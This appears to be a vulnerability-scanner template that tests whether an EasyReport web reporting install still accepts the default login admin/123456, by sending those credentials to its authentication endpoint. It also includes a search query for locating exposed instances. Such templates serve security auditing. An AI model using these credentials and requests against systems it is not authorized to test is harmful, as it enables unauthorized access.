id: easyreport-default-login

info:
  name: EasyReport - Default Login
  author: SleepingBag945
  severity: high
  classification:
    cpe: cpe:2.3:a:easyreport:easyreport:*:*:*:*:*:*:*:*
    cwe-id: CWE-798
  metadata:
    verified: true
    max-request: 1
    fofa-query: body="EasyReport-A Sample and Easy to Use Web Reporting System"
    vendor: easyreport
    product: easyreport
  tags: easyreport,default-login,vuln

http:
  - raw:
      - |
        POST /member/authenticate HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json, text/javascript, */*; q=0.01
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
        X-Requested-With: XMLHttpRequest

        account={{username}}&password={{password}}&rememberMe=false

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - 123456

    matchers-condition: and
    matchers:
      - type: word
        name: easyreport
        cpe: cpe:2.3:a:easyreport:easyreport:*:*:*:*:*:*:*:*
        part: body
        words:
          - '"code":'
          - '"detailMsg":'
          - '"data":true'
        condition: and

      - type: word
        name: easyreport-2
        cpe: cpe:2.3:a:easyreport:easyreport:*:*:*:*:*:*:*:*
        part: header
        words:
          - 'application/json'

      - type: status
        status:
          - 200
